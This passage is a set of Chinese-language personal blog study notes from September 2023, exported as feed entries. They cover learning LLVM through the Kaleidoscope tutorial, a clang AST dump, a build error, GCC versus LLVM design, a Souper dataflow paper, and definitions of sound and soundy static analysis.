<h4 id="Finding-Test-Inputs"><a href="#Finding-Test-Inputs" class="headerlink" title="Finding Test Inputs"></a>Finding Test Inputs</h4><p>作者使用 SPEC CPU 2017 中的 C C++ benchmarks，關閉 Souper 的 syntjesos，最後他們產生了 269113 的 Souper expressions，71.6% 重複不止一次， 11.4% 重複超過 10次，1.6% 超過 100次。<del>（這有什麽意義嗎，感覺和文章想做的事情沒什麽關係，後面再看看）</del></p>
<h4 id="Enabling-Comparable-Reslts"><a href="#Enabling-Comparable-Reslts" class="headerlink" title="Enabling Comparable Reslts"></a>Enabling Comparable Reslts</h4><p>他們不能輕易的獲得 precise dataflow results，也就很難進行比較，比如 LLVM integer analysis 存在過程閒的分析，而他們處理不了。作者的思路是再把 Souper IR 轉換成 LLVM IR 進行比較。<del>實在難以理解，爲什麽會分析不了，因爲 Souper 本身就不支持過程閒分析嗎，最後居然要再轉換成 LLVM IR 來比較二者的精度</del></p>
<h4 id="Algorithms-for-Maximally-Precise-Dataflow-Analyses"><a href="#Algorithms-for-Maximally-Precise-Dataflow-Analyses" class="headerlink" title="Algorithms for Maximally Precise Dataflow Analyses"></a>Algorithms for Maximally Precise Dataflow Analyses</h4><p><del>像其他的 synthesis problem 一樣，用 SMT solver 計算 precise 數據流結果是一個 search problem，他使用了多種求解以達到一個最優解，作者的算法通過利用 abstract domains，嘗試所有的可能，從最准確的結果（n sign bits）開始。</del></p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 摸鱼笔记</title>
    <url>/2023/09/27/%E6%95%A3%E8%A8%98-9-27-23/</url>
    <content><![CDATA[<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><blockquote>
<p>There are multiple reasons why pieces of GCC cannot be reused as libraries, including rampant use of global variables, weakly enforced invariants, poorly-designed data structures, sprawling code base, and the use of macros that prevent the codebase from being compiled to support more than one front-end&#x2F;target pair at a time. The hardest problems to fix, though, are the inherent architectural problems that stem from its early design and age. Specifically, GCC suffers from layering problems and leaky abstractions: the back end walks front-end ASTs to generate debug info, the front ends generate back-end data structures, and the entire compiler depends on global data structures set up by the command line interface.</p>
</blockquote>
<p>關於 GCC 和 LLVM 的一個對比，能更加直觀的瞭解到 LLVM 的優勢。GCC 由於其誕生的比較早，對於編譯器的分層和抽象做的不太好，使得後端代碼生成調試信息需要跑一邊前端生成的AST。全局的數據結構，濫用的宏等等導致 GCC 代碼很難重用。</p>
<p><a href="https://aosabook.org/en/v1/llvm.html">https://aosabook.org/en/v1/llvm.html</a></p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 摸鱼笔记</title>
    <url>/2023/09/26/%E6%95%A3%E8%A8%98-9-26-23/</url>
    <content><![CDATA[<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><p>昨天太累，今天繼續休息。但是 LLVM 在編譯了。</p>
<p>該補課了，發現自己編譯的 LLVM 少了一些頭文件，可能是編譯選項沒配置好的原因，這次加上 <code>-DLLVM_ENABLE_PROJECTS=all</code> 希望能正常。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang++ -I /home/rt/llvm-project/llvm/include/ -g -O3 Keleidoscope.cpp <span class="token variable"><span class="token variable">$(</span>llvm-config --cxxflags --ldflags --system-libs --libs core<span class="token variable">)</span></span> -o mytest.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;home&#x2F;rt&#x2F;llvm-project&#x2F;llvm&#x2F;include&#x2F;llvm&#x2F;Support&#x2F;Compiler.h:18:10: fatal error: &#39;llvm&#x2F;Config&#x2F;llvm-config.h&#39; file not found
   18 | #include &quot;llvm&#x2F;Config&#x2F;llvm-config.h&quot;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~
1 error generated.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一點難產了，目錄中的 llvm-config.h 被換成了 llvm-config.h.cmake。不知道該怎麽處理，如果是因爲版本不兼容，打算直接 <code>apt install llvm-dev-14</code> 用以前的版本好了。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 摸鱼笔记</title>
    <url>/2023/09/25/%E6%95%A3%E8%A8%98-9-25-23/</url>
    <content><![CDATA[<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><p>今天只稍微看了部分 LLVM IR JIT 的那一章，摸了</p>
<p>《奧本海默》有點好看的，但是我根本記不住人名，錯過太多心理活動，導致了電影的錯綜複雜的感覺。深夜晚上又被拉出去吃了海底撈。</p>
<p>啥也沒學，負罪感滿滿。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 學習笔记</title>
    <url>/2023/09/24/%E6%95%A3%E8%A8%98-9-24-23/</url>
    <content><![CDATA[<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><p>終於來到激動人心的第三章 LLVM IR（今天是周日，有點擺了</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">Function *PrototypeAST::codegen() &#123;
  &#x2F;&#x2F; Make the function type:  double(double,double) etc.
  std::vector&lt;Type*&gt; Doubles(Args.size(),
                             Type::getDoubleTy(*TheContext));
  FunctionType *FT &#x3D;
    FunctionType::get(Type::getDoubleTy(*TheContext), Doubles, false);

  Function *F &#x3D;
    Function::Create(FT, Function::ExternalLinkage, Name, TheModule.get());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>The call to <code>FunctionType::get</code> creates the <code>FunctionType</code> that should be used for a given Prototype. Since all function arguments in Kaleidoscope are of type double, the first line creates a vector of “N” LLVM double types. It then uses the <code>Functiontype::get</code> method to create a function type that takes “N” doubles as arguments, <strong>returns one double as a result</strong>, and that is not vararg (the false parameter indicates this). Note that Types in LLVM are uniqued just like Constants are, so you don’t “new” a type, you “get” it.</p>
</blockquote>
<p>從中我并沒有看出哪裏返回了 double，我的理解是返回值是否是 double 應該是在函數的 expression 中給定的，所以對於這個（FunctionType::get）就沒有指定返回值是 double 類型。</p>
<p>只要給每個 AST 加一個 codegen 函數就可以比較方便的生成 LLVM IR 的 AST，但是對於其中的 <code>id</code>，<code>number</code>，<code>binary_expression</code>，<code>function</code>，<code>call</code>，<code>prototype</code> 需要定義與 LLVM IR 的轉換。<del>説實話我沒搞懂爲什麽要用這麽多和函數有關的 AST</del></p>
<p>其中有比較重要的幾個全局變量</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>LLVMContext<span class="token operator">></span> TheContext<span class="token punctuation">;</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>IRBuilder<span class="token operator">&lt;</span><span class="token operator">>></span> Builder<span class="token punctuation">;</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> TheModule<span class="token punctuation">;</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>map<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">,</span> Value <span class="token operator">*</span><span class="token operator">></span> NamedValues<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>不太好描述這幾個的實際含義，<code>TheContext</code> 類似於 LLVM IR 的 this 指針，<code>Builder</code> 用來構建 LLVM IR，<code>TheModule</code> 用來構建基本塊，<code>NameValues</code> 存儲全局的數據結構，比如符號表什麽的。</p>
<p><strong>以上寫的可能又有些問題，我過一段時間回查一下</strong></p>
<p>參考資料</p>
<ul>
<li><a href="https://llvm.org/docs/LangRef.html">LLVM IR reference</a></li>
<li><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl03.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl03.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>补充笔记</title>
    <url>/2023/09/23/%E6%95%A3%E8%A8%98-10-6-23/</url>
    <content><![CDATA[<h1 id="About-Sound-amp-Precise？"><a href="#About-Sound-amp-Precise？" class="headerlink" title="About Sound &amp; Precise？"></a>About Sound &amp; Precise？</h1><h2 id="可能存在的名词"><a href="#可能存在的名词" class="headerlink" title="可能存在的名词"></a>可能存在的名词</h2><ul>
<li>sound</li>
</ul>
<p>能够获取所有的动态信息的分析称为 sound</p>
<ul>
<li>soundy</li>
</ul>
<p>想要获取完整的动态信息，对于一些不好处理的语言特性进行合理的处理</p>
<ul>
<li>unsound</li>
</ul>
<p>“开摆”，直接忽略一些不好处理的语言特性，以提高效率，精度等</p>
<ul>
<li>precision</li>
</ul>
<p>不会报错误信息的分析可以称之为 precision</p>
<h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>静态分析在软件开发，编译器，安全研究等地方使用广泛，但是大部分的实际中的静态分析软件不能做到 sound。他们很有可能忽略了类似反射等一些复杂的语言特性。</p>
<p>之所以这么做是因为软件开发者妥协了，如果为了 soundly 适配各种语言特性，静态分析器就很有可能失去 imprecision，或者难以移植，甚至根本用不了。</p>
<p>参考</p>
<ul>
<li>南大的静态分析课程 <a href="https://tai-e.pascal-lab.net/lectures.html">https://tai-e.pascal-lab.net/lectures.html</a></li>
<li>Soundiness Home Page <a href="http://soundiness.org/">http://soundiness.org/</a></li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 學習笔记</title>
    <url>/2023/09/23/%E6%95%A3%E8%A8%98-9-23-23/</url>
    <content><![CDATA[<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><p>今天+第二天早上完成了<br><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl01.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl01.html</a><br><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl02.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl02.html</a></p>
<p>儅我表面上明白了詞法分析與語法分析，寫出來的的代碼卻非常混亂。</p>
<p>思考了一下，發現我非常容易疏忽于<strong>什麽時候應該gettok</strong>，<strong>異常處理，解析后有問題的地方應該返回nullptr</strong>，<strong>應該用什麽樣的代碼處理產生式</strong>。</p>
<p>最後寫出來代碼還是和提供的代碼沒什麽差別，在某些地方對字符串的解析并不完全。</p>
<p>貼一下我認爲非常精妙的代碼</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Parse oprhs::(op primary)*</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>ExprAST<span class="token operator">></span> <span class="token function">ParseBinOpRHS</span><span class="token punctuation">(</span><span class="token keyword">int</span> ExprPrec<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>ExprAST<span class="token operator">></span> LHS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> TokPrec <span class="token operator">=</span> <span class="token function">GetTokenPrecedence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>TokPrec <span class="token operator">&lt;</span> ExprPrec<span class="token punctuation">)</span> 
            <span class="token keyword">return</span> LHS<span class="token punctuation">;</span>
        
        <span class="token keyword">char</span> BinOp <span class="token operator">=</span> CurTok<span class="token punctuation">;</span>
        <span class="token function">getNextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">auto</span> RHS <span class="token operator">=</span> <span class="token function">ParsePrimary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RHS<span class="token punctuation">)</span> 
            <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>

        <span class="token keyword">auto</span> NextPrec <span class="token operator">=</span> <span class="token function">GetTokenPrecedence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>TokPrec <span class="token operator">&lt;</span> NextPrec<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            RHS <span class="token operator">=</span> <span class="token function">ParseBinOpRHS</span><span class="token punctuation">(</span>TokPrec<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>RHS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RHS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        LHS <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>BinaryExprAST<span class="token operator">></span></span></span><span class="token punctuation">(</span>BinOp<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>LHS<span class="token punctuation">)</span><span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>RHS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Parse expression::primary oprhs</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>ExprAST<span class="token operator">></span> <span class="token function">ParseExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> LHS <span class="token operator">=</span> <span class="token function">ParsePrimary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>LHS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">ParseBinOpRHS</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>LHS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ExprPrec 的復用，既可以檢測是否表達式到達末尾，又可以檢測下一個運算符優先級是否比當前的優先級高。當遇到優先級較高的運算符后，我們可以通過對遞歸地對 RHS 處理，遇到稍低於高優先級的表達式的時候返回這個 RHS，從而實現最左推導。否則直接把整個 RHS 處理完就違背了 自頂向下的 LL(1) 的原則了。</p>
<p>明天將進入激動人心的 LLVM-IR</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 學習笔记</title>
    <url>/2023/09/22/%E6%95%A3%E8%A8%98-9-22-23/</url>
    <content><![CDATA[<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><p>LLVM 全稱是 Low Level Virtual Machine，開始時還不太理解 LLVM 到底有啥用，爲什麽這麽好用。</p>
<p>衆所周知 gcc 也可以劃分爲相應的 前端 中端 後端。爲什麽 gcc 沒有 llvm 怎麽好用，可見 llvm 的結構設計的比較優秀，非常適合代碼 reuse。把 AST 等 IR 做了隔離，讓我們可以非常方便的利用 IR 做一些工作。</p>
<p><del>接下來我打算從前端開始學習 LLVM 的源碼。</del> 我認爲（書上寫的）還是先試一下這個 reuse 的特性。To be honest，之前并沒有學過 cmake，遇到問題了，基本也只是在源代碼的上面進行一點修改，並不需要掌握這個能力，趁現在我們也可以學習鞏固一番相關的知識。</p>
<p>今天不知道爲什麽效率有一點低，可能早上被 4 節思政課折磨的緣故，下午就看了會兒漫畫打了會鐵道，晚上再吃一個肯爺爺（鐵道周邊），穿插一些 b 站短視頻。有一絲絲罪惡感。</p>
<p>晚上稍微對 AST 進行了一點思考，LLVM 爲什麽要把諸如 “詞法分析” “語法分析” ”語義分析“ 進行一定的抽離，只是爲了代碼復用嗎，既然要代碼復用，他的目的是什麽呢，如果沒有代碼復用的必要，必然沒有拆離的必要。這也許可以部分解釋之前 GCC 爲什麽沒有這樣設計。也就是説，詞法分析後的 Token，語法分析樹、三地址代碼、抽象語法樹等中間表示（IR）是有各自的特點（優點&#x2F;缺點的），如何結合各自的優缺點進行工作，也許是非常值得研究的方向。</p>
<p>爲了熟悉 AST，我們先看一下 llvm 的 AST 是怎麽樣的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">\\ hello<span class="token punctuation">.</span>c
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> k <span class="token operator">=</span> i<span class="token operator">+</span>j<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello wolrd %d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>clang -target riscv64 -march=rv64g -Xclang -ast-dump -fsyntax-only hello.c</code></p>
<p>其中 -Xclang 表示把後面的參數傳給 clang 前端，-ast-dump 打印出抽象語法樹。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token operator">|</span>-TypedefDecl 0x7527a8 <span class="token operator">&lt;&lt;</span>invalid sloc<span class="token operator">>></span> <span class="token operator">&lt;</span>invalid sloc<span class="token operator">></span> implicit __builtin_va_list <span class="token string">'void *'</span>
<span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-PointerType 0x71aa10 <span class="token string">'void *'</span>
<span class="token operator">|</span>   <span class="token variable">`</span></span>-BuiltinType 0x719ab0 <span class="token string">'void'</span>
<span class="token operator">|</span>-FunctionDecl 0x777bc8 <span class="token operator">&lt;</span>hello.c:3:1, line:7:<span class="token operator"><span class="token file-descriptor important">1</span>></span> line:3:5 main <span class="token string">'int ()'</span>
<span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-CompoundStmt 0x7782e8 <span class="token operator">&lt;</span>col:11, line:7:<span class="token operator"><span class="token file-descriptor important">1</span>></span>
<span class="token operator">|</span>   <span class="token operator">|</span>-DeclStmt 0x777f20 <span class="token operator">&lt;</span>line:4:5, col:3<span class="token operator"><span class="token file-descriptor important">0</span>></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-VarDecl 0x777cc8 <span class="token operator">&lt;</span>col:5, col:1<span class="token operator"><span class="token file-descriptor important">3</span>></span> col:9 used i <span class="token string">'int'</span> cinit
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable">`</span></span>-IntegerLiteral 0x777d30 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">3</span>></span> <span class="token string">'int'</span> <span class="token number">0</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-VarDecl 0x777d68 <span class="token operator">&lt;</span>col:5, col:2<span class="token operator"><span class="token file-descriptor important">0</span>></span> col:16 used j <span class="token string">'int'</span> cinit
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-IntegerLiteral 0x777dd0 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token string">'int'</span> <span class="token number">3</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token variable">`</span></span>-VarDecl 0x777e08 <span class="token operator">&lt;</span>col:5, col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> col:23 used k <span class="token string">'int'</span> cinit
<span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-BinaryOperator 0x777ee0 <span class="token operator">&lt;</span>col:27, col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token string">'int'</span> <span class="token string">'+'</span>
<span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>-ImplicitCastExpr 0x777eb0 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">7</span>></span> <span class="token string">'int'</span> <span class="token operator">&lt;</span>LValueToRValue<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token variable">`</span></span>-DeclRefExpr 0x777e70 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">7</span>></span> <span class="token string">'int'</span> lvalue Var 0x777cc8 <span class="token string">'i'</span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token variable"><span class="token variable">`</span>-ImplicitCastExpr 0x777ec8 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token string">'int'</span> <span class="token operator">&lt;</span>LValueToRValue<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span>       <span class="token variable">`</span></span>-DeclRefExpr 0x777e90 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token string">'int'</span> lvalue Var 0x777d68 <span class="token string">'j'</span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token operator">|</span>-CallExpr 0x778240 <span class="token operator">&lt;</span>line:5:5, col:3<span class="token operator"><span class="token file-descriptor important">3</span>></span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-ImplicitCastExpr 0x778228 <span class="token operator">&lt;</span>col:<span class="token operator"><span class="token file-descriptor important">5</span>></span> <span class="token string">'int (*)(const char *, ...)'</span> <span class="token operator">&lt;</span>FunctionToPointerDecay<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-DeclRefExpr 0x778118 <span class="token operator">&lt;</span>col:<span class="token operator"><span class="token file-descriptor important">5</span>></span> <span class="token string">'int (const char *, ...)'</span> Function 0x777f78 <span class="token string">'printf'</span> <span class="token string">'int (const char *, ...)'</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-ImplicitCastExpr 0x778288 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'const char *'</span> <span class="token operator">&lt;</span>NoOp<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable">`</span></span>-ImplicitCastExpr 0x778270 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'char *'</span> <span class="token operator">&lt;</span>ArrayToPointerDecay<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-StringLiteral 0x778178 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'char[16]'</span> lvalue <span class="token string">"hello wolrd %d<span class="token entity" title="\n">\n</span>"</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token variable">`</span></span>-ImplicitCastExpr 0x7782a0 <span class="token operator">&lt;</span>col:3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'int'</span> <span class="token operator">&lt;</span>LValueToRValue<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-DeclRefExpr 0x7781a0 <span class="token operator">&lt;</span>col:3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'int'</span> lvalue Var 0x777e08 <span class="token string">'k'</span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token variable">`</span></span>-ReturnStmt 0x7782d8 <span class="token operator">&lt;</span>line:6:5, col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span>
<span class="token operator">|</span>     <span class="token variable"><span class="token variable">`</span>-IntegerLiteral 0x7782b8 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'int'</span> <span class="token number">0</span>
<span class="token variable">`</span></span>-FunctionDecl 0x777f78 <span class="token operator">&lt;</span>line:5:<span class="token operator"><span class="token file-descriptor important">5</span>></span> col:5 implicit used <span class="token builtin class-name">printf</span> <span class="token string">'int (const char *, ...)'</span> extern
  <span class="token operator">|</span>-ParmVarDecl 0x778070 <span class="token operator">&lt;&lt;</span>invalid sloc<span class="token operator">>></span> <span class="token operator">&lt;</span>invalid sloc<span class="token operator">></span> <span class="token string">'const char *'</span>
  <span class="token operator">|</span>-BuiltinAttr 0x778018 <span class="token operator">&lt;&lt;</span>invalid sloc<span class="token operator">>></span> Implicit <span class="token number">824</span>
  `-FormatAttr 0x7780e0 <span class="token operator">&lt;</span>col:<span class="token operator"><span class="token file-descriptor important">5</span>></span> Implicit <span class="token builtin class-name">printf</span> <span class="token number">1</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我們很清楚的知道 1+2 的 AST 描述，但是如果只考慮 1+2，顯然無法表示整個程序。雖然在構建 AST 的過程中會丟失信息，但是至少還是要能表示程序的。如何構建 AST，AST 有什麽樣的作用，僅僅是一個中間環節嗎，還需要更深的理解。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM 學習笔记</title>
    <url>/2023/09/21/%E6%95%A3%E8%A8%98-9-21-23/</url>
    <content><![CDATA[<p>看到以前的一篇日期是2020年，一些情感如鯁在喉。好久沒有寫筆記了，接下來準備重啓筆記計劃，可能也會偷偷發發論文筆記</p>
<h1 id="LLVM-學習"><a href="#LLVM-學習" class="headerlink" title="LLVM 學習"></a>LLVM 學習</h1><h2 id="LLVM-版本"><a href="#LLVM-版本" class="headerlink" title="LLVM 版本"></a>LLVM 版本</h2><pre class="line-numbers language-none"><code class="language-none">commit ea42c4ac6a24c28fc12d5373a851ff376ea452cf (HEAD -&gt; main)
Author: Paul Walker &lt;paul.walker@arm.com&gt;
Date:   Fri Sep 8 16:14:58 2023 +0000

    [SVE] Precommit test to show missing initialisation of call operand.
    
    When calling func_f8_and_v0_passed_via_memory the memory used to
    hold the first vector operand is allocated but not initialised.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="LLVM-源碼結構"><a href="#LLVM-源碼結構" class="headerlink" title="LLVM 源碼結構"></a>LLVM 源碼結構</h2><pre class="line-numbers language-none"><code class="language-none">├── CODE_OF_CONDUCT.md
├── CONTRIBUTING.md
├── LICENSE.TXT
├── README.md
├── SECURITY.md
├── bolt
├── build
├── build-llvm
├── clang
├── clang-tools-extra
├── cmake
